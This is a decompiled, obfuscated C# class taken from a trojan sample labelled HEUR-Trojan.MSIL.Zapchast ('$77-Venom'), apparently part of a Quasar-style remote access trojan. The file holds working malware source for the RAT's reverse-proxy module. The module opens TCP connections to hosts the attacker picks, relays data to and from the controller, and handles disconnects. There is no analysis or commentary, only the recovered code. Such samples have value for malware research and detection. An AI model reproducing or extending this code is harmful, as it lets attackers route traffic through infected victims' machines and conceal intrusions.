// Decompiled with JetBrains decompiler
// Type: ⯩Ⴒ鮡䈄퉥䑎꼬春쒦諺똻ﻤ⣕償�홙�
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Net;
using System.Net.Sockets;
using xClient.Core.ReverseProxy.Packets;

public class \uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD
{
  public const int 躠\uF59F㓠疕ၪ؀춎ꎿﱵ盝骄엧ꕸ胎\uFFFD\uF16E罥ብ鄄ﭵ = 8192;
  private byte[] 繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴;
  private bool \uFFFD療ҩ\uF787\uEC6C\u224Cž眈暂\u2F91గ\u0BE0멚팅踴裥鸦\uFFFD覾囱;

  public int ConnectionId { get; private set; }

  public Socket Handle { get; private set; }

  public string Target { get; private set; }

  public int Port { get; private set; }

  public 㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ Client { get; private set; }

  public \uEBF9\u2BE9Ⴒ鮡䈄\uED9B퉥䑎꼬春쒦諺똻ﻤ\u28D5償\uEED7\uFFFD홙\uFFFD(
    ReverseProxyConnect command,
    㺏\u28AF耲狪壨\uF626郾㺍\uF82EὉ᧑疘ꕲ㥛兂\uF5F7霜溹\u0A92೦ client)
  {
    this.ConnectionId = command.ConnectionId;
    this.Target = command.Target;
    this.Port = command.Port;
    this.Client = client;
    this.Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    this.Handle.BeginConnect(command.Target, command.Port, new AsyncCallback(this.눑艔륥\u2982刳\uFFFD썻겗\uF6FB︇浹伧ꞁ䳰뎎쎦ꠣ慰幃墺), (object) null);
  }

  private void 눑艔륥\u2982刳\uFFFD썻겗\uF6FB︇浹伧ꞁ䳰뎎쎦ꠣ慰幃墺(IAsyncResult ar)
  {
    try
    {
      this.Handle.EndConnect(ar);
    }
    catch
    {
    }
    if (this.Handle.Connected)
    {
      try
      {
        this.繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴 = new byte[8192];
        this.Handle.BeginReceive(this.繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴, 0, this.繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴.Length, SocketFlags.None, new AsyncCallback(this.뗇啰韐\u2373툍锡\uE50F袬咴过\uE99B\uE6FC妡뮹\uFFFD笁籍骽ｴ펓), (object) null);
      }
      catch
      {
        new ReverseProxyConnectResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
        this.䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾();
      }
      IPEndPoint localEndPoint = (IPEndPoint) this.Handle.LocalEndPoint;
      new ReverseProxyConnectResponse(this.ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(this.Client);
    }
    else
      new ReverseProxyConnectResponse(this.ConnectionId, false, (IPAddress) null, 0, this.Target).Execute(this.Client);
  }

  private void 뗇啰韐\u2373툍锡\uE50F袬咴过\uE99B\uE6FC妡뮹\uFFFD笁籍骽ｴ펓(IAsyncResult ar)
  {
    try
    {
      int length = this.Handle.EndReceive(ar);
      if (length <= 0)
      {
        this.䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾();
        return;
      }
      byte[] numArray = new byte[length];
      Array.Copy((Array) this.繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴, (Array) numArray, length);
      new ReverseProxyData(this.ConnectionId, numArray).Execute(this.Client);
    }
    catch
    {
      this.䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾();
      return;
    }
    try
    {
      this.Handle.BeginReceive(this.繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴, 0, this.繬ﻩ\u251F\uE78CӇ\uFFFD銈ݝ艐Ὰ㑦趬刺깞\uE5AD꿪\uFFFD玞\uE40A쇴.Length, SocketFlags.None, new AsyncCallback(this.뗇啰韐\u2373툍锡\uE50F袬咴过\uE99B\uE6FC妡뮹\uFFFD笁籍骽ｴ펓), (object) null);
    }
    catch
    {
      this.䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾();
    }
  }

  public void 䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾()
  {
    if (!this.\uFFFD療ҩ\uF787\uEC6C\u224Cž眈暂\u2F91గ\u0BE0멚팅踴裥鸦\uFFFD覾囱)
    {
      this.\uFFFD療ҩ\uF787\uEC6C\u224Cž眈暂\u2F91గ\u0BE0멚팅踴裥鸦\uFFFD覾囱 = true;
      new ReverseProxyDisconnect(this.ConnectionId).Execute(this.Client);
    }
    try
    {
      this.Handle.Close();
    }
    catch
    {
    }
    this.Client.泿㙵\u2EF6賓\uA4B5髖ꀃ篝쥧虽溚퓁ᢘ颷\u2683籣ꎴ驡烙뺠(this.ConnectionId);
  }

  public void \u0ED8鮗㟕ﭪ쎁痊䦍ɟ䡗魛壙장擤뛥䕕뷿Ӳ䅣猞\u2350(byte[] data)
  {
    try
    {
      this.Handle.Send(data);
    }
    catch
    {
      this.䆅㝻쟍\uFFFDో̯쐞\uA494囒믒檮\uF333軏疭ͼᣨ\u2446\uE7C8\uEF9E㺾();
    }
  }
}
